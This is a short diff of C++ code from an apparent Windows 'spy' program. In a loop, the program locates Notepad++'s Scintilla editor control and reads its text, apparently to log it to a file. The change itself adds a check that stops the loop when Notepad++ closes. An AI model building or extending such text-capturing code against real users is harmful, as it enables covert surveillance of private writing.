@@ -67,6 +67,10 @@ void startSpy(HWND hwnd) {
     /*std::cout << myDocumentsPath << std::endl;*/
     /*Create the full path for the log file*/
     while (true) {
+        if (FindWindow(L"Notepad++", NULL) == NULL) {
+            std::cout << "Notepad++ has been closed. Stopping spy process." << std::endl;
+            break;
+        }
         HWND hEdit = FindWindowEx(hwnd, NULL, L"Scintilla", NULL);
         if (hEdit) {
             LRESULT textLength = SendMessage(hEdit, WM_GETTEXTLENGTH, 0, 0);
